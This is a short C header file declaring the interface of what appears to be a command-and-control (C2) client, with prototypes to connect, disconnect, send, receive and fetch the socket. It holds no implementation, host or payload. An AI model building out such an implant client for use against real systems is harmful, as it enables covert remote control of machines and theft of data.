#ifndef C2_CLIENT_H
#define C2_CLIENT_H

// Connects to the C2 server
int c2_connect();

// Disconnects from the C2 server
void c2_disconnect();

// Sends data to the C2 server (thread-safe)
int c2_send(char *data, int len);

// Receives data from the C2 server
int c2_recv(char *buffer, int len);

// Gets the C2 socket file descriptor
int get_c2_sock();

#endif // C2_CLIENT_H
